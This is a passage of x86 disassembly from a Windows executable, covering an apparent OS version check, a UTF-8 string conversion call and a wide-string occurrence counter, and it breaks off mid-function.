  405590:	1b c0                	sbb    %eax,%eax
  405592:	40                   	inc    %eax
  405593:	eb 02                	jmp    0x405597
  405595:	33 c0                	xor    %eax,%eax
  405597:	5f                   	pop    %edi
  405598:	5e                   	pop    %esi
  405599:	c3                   	ret
  40559a:	81 ec 4c 03 00 00    	sub    $0x34c,%esp
  4055a0:	53                   	push   %ebx
  4055a1:	55                   	push   %ebp
  4055a2:	56                   	push   %esi
  4055a3:	57                   	push   %edi
  4055a4:	8d 44 24 10          	lea    0x10(%esp),%eax
  4055a8:	c7 44 24 10 14 01 00 	movl   $0x114,0x10(%esp)
  4055af:	00 
  4055b0:	50                   	push   %eax
  4055b1:	be c8 00 00 00       	mov    $0xc8,%esi
  4055b6:	33 db                	xor    %ebx,%ebx
  4055b8:	33 ff                	xor    %edi,%edi
  4055ba:	ff 15 30 75 41 00    	call   *0x417530
  4055c0:	85 c0                	test   %eax,%eax
  4055c2:	0f 84 2a 01 00 00    	je     0x4056f2
  4055c8:	8b 44 24 20          	mov    0x20(%esp),%eax
  4055cc:	48                   	dec    %eax
  4055cd:	0f 84 02 01 00 00    	je     0x4056d5
  4055d3:	48                   	dec    %eax
  4055d4:	0f 85 18 01 00 00    	jne    0x4056f2
  4055da:	8d 84 24 24 01 00 00 	lea    0x124(%esp),%eax
  4055e1:	33 ed                	xor    %ebp,%ebp
  4055e3:	50                   	push   %eax
  4055e4:	e8 6a ff ff ff       	call   0x405553
  4055e9:	59                   	pop    %ecx
  4055ea:	85 c0                	test   %eax,%eax
  4055ec:	74 18                	je     0x405606
  4055ee:	8b 9c 24 28 01 00 00 	mov    0x128(%esp),%ebx
  4055f5:	8b bc 24 2c 01 00 00 	mov    0x12c(%esp),%edi
  4055fc:	80 bc 24 3e 02 00 00 	cmpb   $0x1,0x23e(%esp)
  405603:	01 
  405604:	eb 2d                	jmp    0x405633
  405606:	8d 84 24 40 02 00 00 	lea    0x240(%esp),%eax
  40560d:	c7 84 24 40 02 00 00 	movl   $0x11c,0x240(%esp)
  405614:	1c 01 00 00 
  405618:	50                   	push   %eax
  405619:	ff 15 30 75 41 00    	call   *0x417530
  40561f:	85 c0                	test   %eax,%eax
  405621:	74 15                	je     0x405638
  405623:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  405627:	8b 7c 24 18          	mov    0x18(%esp),%edi
  40562b:	80 bc 24 5a 03 00 00 	cmpb   $0x1,0x35a(%esp)
  405632:	01 
  405633:	75 03                	jne    0x405638
  405635:	33 ed                	xor    %ebp,%ebp
  405637:	45                   	inc    %ebp
  405638:	83 eb 03             	sub    $0x3,%ebx
  40563b:	0f 84 90 00 00 00    	je     0x4056d1
  405641:	4b                   	dec    %ebx
  405642:	0f 84 85 00 00 00    	je     0x4056cd
  405648:	4b                   	dec    %ebx
  405649:	74 61                	je     0x4056ac
  40564b:	4b                   	dec    %ebx
  40564c:	74 18                	je     0x405666
  40564e:	83 eb 04             	sub    $0x4,%ebx
  405651:	0f 85 9b 00 00 00    	jne    0x4056f2
  405657:	85 ff                	test   %edi,%edi
  405659:	0f 85 93 00 00 00    	jne    0x4056f2
  40565f:	6a 6e                	push   $0x6e
  405661:	e9 8b 00 00 00       	jmp    0x4056f1
  405666:	83 ef 00             	sub    $0x0,%edi
  405669:	74 33                	je     0x40569e
  40566b:	4f                   	dec    %edi
  40566c:	74 22                	je     0x405690
  40566e:	4f                   	dec    %edi
  40566f:	74 11                	je     0x405682
  405671:	4f                   	dec    %edi
  405672:	75 7e                	jne    0x4056f2
  405674:	8b f5                	mov    %ebp,%esi
  405676:	f7 de                	neg    %esi
  405678:	1b f6                	sbb    %esi,%esi
  40567a:	83 e6 fb             	and    $0xfffffffb,%esi
  40567d:	83 c6 69             	add    $0x69,%esi
  405680:	eb 70                	jmp    0x4056f2
  405682:	8b f5                	mov    %ebp,%esi
  405684:	f7 de                	neg    %esi
  405686:	1b f6                	sbb    %esi,%esi
  405688:	83 e6 fb             	and    $0xfffffffb,%esi
  40568b:	83 c6 5f             	add    $0x5f,%esi
  40568e:	eb 62                	jmp    0x4056f2
  405690:	8b f5                	mov    %ebp,%esi
  405692:	f7 de                	neg    %esi
  405694:	1b f6                	sbb    %esi,%esi
  405696:	83 e6 fb             	and    $0xfffffffb,%esi
  405699:	83 c6 55             	add    $0x55,%esi
  40569c:	eb 54                	jmp    0x4056f2
  40569e:	8b f5                	mov    %ebp,%esi
  4056a0:	f7 de                	neg    %esi
  4056a2:	1b f6                	sbb    %esi,%esi
  4056a4:	83 e6 fb             	and    $0xfffffffb,%esi
  4056a7:	83 c6 4b             	add    $0x4b,%esi
  4056aa:	eb 46                	jmp    0x4056f2
  4056ac:	83 ef 00             	sub    $0x0,%edi
  4056af:	74 18                	je     0x4056c9
  4056b1:	4f                   	dec    %edi
  4056b2:	74 11                	je     0x4056c5
  4056b4:	4f                   	dec    %edi
  4056b5:	75 3b                	jne    0x4056f2
  4056b7:	8b f5                	mov    %ebp,%esi
  4056b9:	f7 de                	neg    %esi
  4056bb:	1b f6                	sbb    %esi,%esi
  4056bd:	83 e6 fb             	and    $0xfffffffb,%esi
  4056c0:	83 c6 41             	add    $0x41,%esi
  4056c3:	eb 2d                	jmp    0x4056f2
  4056c5:	6a 3c                	push   $0x3c
  4056c7:	eb 28                	jmp    0x4056f1
  4056c9:	6a 32                	push   $0x32
  4056cb:	eb 24                	jmp    0x4056f1
  4056cd:	6a 14                	push   $0x14
  4056cf:	eb 20                	jmp    0x4056f1
  4056d1:	6a 05                	push   $0x5
  4056d3:	eb 1c                	jmp    0x4056f1
  4056d5:	8b 44 24 18          	mov    0x18(%esp),%eax
  4056d9:	85 c0                	test   %eax,%eax
  4056db:	74 12                	je     0x4056ef
  4056dd:	83 f8 0a             	cmp    $0xa,%eax
  4056e0:	74 09                	je     0x4056eb
  4056e2:	83 f8 5a             	cmp    $0x5a,%eax
  4056e5:	75 0b                	jne    0x4056f2
  4056e7:	6a 28                	push   $0x28
  4056e9:	eb 06                	jmp    0x4056f1
  4056eb:	6a 1e                	push   $0x1e
  4056ed:	eb 02                	jmp    0x4056f1
  4056ef:	6a 0a                	push   $0xa
  4056f1:	5e                   	pop    %esi
  4056f2:	5f                   	pop    %edi
  4056f3:	8b c6                	mov    %esi,%eax
  4056f5:	5e                   	pop    %esi
  4056f6:	5d                   	pop    %ebp
  4056f7:	5b                   	pop    %ebx
  4056f8:	81 c4 4c 03 00 00    	add    $0x34c,%esp
  4056fe:	c3                   	ret
  4056ff:	cc                   	int3
  405700:	55                   	push   %ebp
  405701:	56                   	push   %esi
  405702:	8b 74 24 0c          	mov    0xc(%esp),%esi
  405706:	57                   	push   %edi
  405707:	85 f6                	test   %esi,%esi
  405709:	75 05                	jne    0x405710
  40570b:	be 24 30 41 00       	mov    $0x413024,%esi
  405710:	6a 00                	push   $0x0
  405712:	6a 00                	push   $0x0
  405714:	6a 00                	push   $0x0
  405716:	6a 00                	push   $0x0
  405718:	6a ff                	push   $0xffffffff
  40571a:	56                   	push   %esi
  40571b:	6a 00                	push   $0x0
  40571d:	68 e9 fd 00 00       	push   $0xfde9
  405722:	ff 15 34 75 41 00    	call   *0x417534
  405728:	8b e8                	mov    %eax,%ebp
  40572a:	55                   	push   %ebp
  40572b:	e8 70 44 00 00       	call   0x409ba0
  405730:	8b f8                	mov    %eax,%edi
  405732:	85 ff                	test   %edi,%edi
  405734:	74 16                	je     0x40574c
  405736:	6a 00                	push   $0x0
  405738:	6a 00                	push   $0x0
  40573a:	55                   	push   %ebp
  40573b:	57                   	push   %edi
  40573c:	6a ff                	push   $0xffffffff
  40573e:	56                   	push   %esi
  40573f:	6a 00                	push   $0x0
  405741:	68 e9 fd 00 00       	push   $0xfde9
  405746:	ff 15 34 75 41 00    	call   *0x417534
  40574c:	8b c7                	mov    %edi,%eax
  40574e:	5f                   	pop    %edi
  40574f:	5e                   	pop    %esi
  405750:	5d                   	pop    %ebp
  405751:	c2 04 00             	ret    $0x4
  405754:	cc                   	int3
  405755:	cc                   	int3
  405756:	cc                   	int3
  405757:	cc                   	int3
  405758:	cc                   	int3
  405759:	cc                   	int3
  40575a:	cc                   	int3
  40575b:	cc                   	int3
  40575c:	cc                   	int3
  40575d:	cc                   	int3
  40575e:	cc                   	int3
  40575f:	cc                   	int3
  405760:	8b 44 24 04          	mov    0x4(%esp),%eax
  405764:	57                   	push   %edi
  405765:	33 ff                	xor    %edi,%edi
  405767:	85 c0                	test   %eax,%eax
  405769:	74 78                	je     0x4057e3
  40576b:	8b 54 24 0c          	mov    0xc(%esp),%edx
  40576f:	85 d2                	test   %edx,%edx
  405771:	74 70                	je     0x4057e3
  405773:	55                   	push   %ebp
  405774:	0f b7 2a             	movzwl (%edx),%ebp
  405777:	66 85 ed             	test   %bp,%bp
  40577a:	74 60                	je     0x4057dc
  40577c:	0f b7 08             	movzwl (%eax),%ecx
  40577f:	66 85 c9             	test   %cx,%cx
  405782:	74 58                	je     0x4057dc
  405784:	53                   	push   %ebx
  405785:	56                   	push   %esi
  405786:	83 c0 02             	add    $0x2,%eax
  405789:	66 3b cd             	cmp    %bp,%cx
  40578c:	75 3d                	jne    0x4057cb
  40578e:	8d 4a 02             	lea    0x2(%edx),%ecx
  405791:	8b d8                	mov    %eax,%ebx
  405793:	0f b7 10             	movzwl (%eax),%edx
  405796:	66 85 d2             	test   %dx,%dx
  405799:	74 21                	je     0x4057bc
  40579b:	eb 03                	jmp    0x4057a0
  40579d:	8d 49 00             	lea    0x0(%ecx),%ecx
  4057a0:	0f b7 31             	movzwl (%ecx),%esi
  4057a3:	66 85 f6             	test   %si,%si
  4057a6:	74 1a                	je     0x4057c2
  4057a8:	66 3b d6             	cmp    %si,%dx
  4057ab:	75 0f                	jne    0x4057bc
  4057ad:	0f b7 50 02          	movzwl 0x2(%eax),%edx
  4057b1:	83 c0 02             	add    $0x2,%eax
  4057b4:	83 c1 02             	add    $0x2,%ecx
  4057b7:	66 85 d2             	test   %dx,%dx
  4057ba:	75 e4                	jne    0x4057a0
  4057bc:	66 83 39 00          	cmpw   $0x0,(%ecx)
  4057c0:	75 03                	jne    0x4057c5
  4057c2:	47                   	inc    %edi
  4057c3:	eb 02                	jmp    0x4057c7
  4057c5:	8b c3                	mov    %ebx,%eax
  4057c7:	8b 54 24 18          	mov    0x18(%esp),%edx
  4057cb:	0f b7 08             	movzwl (%eax),%ecx
  4057ce:	66 85 c9             	test   %cx,%cx
  4057d1:	75 b3                	jne    0x405786
  4057d3:	5e                   	pop    %esi
  4057d4:	5b                   	pop    %ebx
  4057d5:	5d                   	pop    %ebp
  4057d6:	8b c7                	mov    %edi,%eax
  4057d8:	5f                   	pop    %edi
  4057d9:	c2 08 00             	ret    $0x8
  4057dc:	5d                   	pop    %ebp
  4057dd:	8b c7                	mov    %edi,%eax
  4057df:	5f                   	pop    %edi
  4057e0:	c2 08 00             	ret    $0x8
  4057e3:	8b c7                	mov    %edi,%eax
  4057e5:	5f                   	pop    %edi
  4057e6:	c2 08 00             	ret    $0x8
  4057e9:	cc                   	int3
  4057ea:	cc                   	int3
  4057eb:	cc                   	int3
  4057ec:	cc                   	int3
  4057ed:	cc                   	int3
  4057ee:	cc                   	int3
  4057ef:	cc                   	int3
  4057f0:	51                   	push   %ecx
  4057f1:	8b 54 24 0c          	mov    0xc(%esp),%edx
  4057f5:	55                   	push   %ebp
  4057f6:	33 ed                	xor    %ebp,%ebp
  4057f8:	83 fa 01             	cmp    $0x1,%edx
  4057fb:	0f 8c 0e 01 00 00    	jl     0x40590f
  405801:	53                   	push   %ebx
  405802:	56                   	push   %esi
  405803:	8b 74 24 14          	mov    0x14(%esp),%esi
  405807:	57                   	push   %edi
  405808:	85 f6                	test   %esi,%esi
  40580a:	75 05                	jne    0x405811
  40580c:	be 24 30 41 00       	mov    $0x413024,%esi
  405811:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  405815:	85 c9                	test   %ecx,%ecx
  405817:	75 09                	jne    0x405822
  405819:	b9 24 30 41 00       	mov    $0x413024,%ecx
  40581e:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  405822:	0f b7 01             	movzwl (%ecx),%eax
  405825:	33 ff                	xor    %edi,%edi
  405827:	89 44 24 10          	mov    %eax,0x10(%esp)
  40582b:	8b de                	mov    %esi,%ebx
  40582d:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  405831:	66 85 c0             	test   %ax,%ax
  405834:	74 5c                	je     0x405892
  405836:	66 39 79 02          	cmp    %di,0x2(%ecx)
  40583a:	74 56                	je     0x405892
  40583c:	8b d9                	mov    %ecx,%ebx
  40583e:	8d 53 02             	lea    0x2(%ebx),%edx
  405841:	66 8b 03             	mov    (%ebx),%ax
  405844:	83 c3 02             	add    $0x2,%ebx
  405847:	66 85 c0             	test   %ax,%ax
  40584a:	75 f5                	jne    0x405841
  40584c:	2b da                	sub    %edx,%ebx
  40584e:	d1 fb                	sar    $1,%ebx
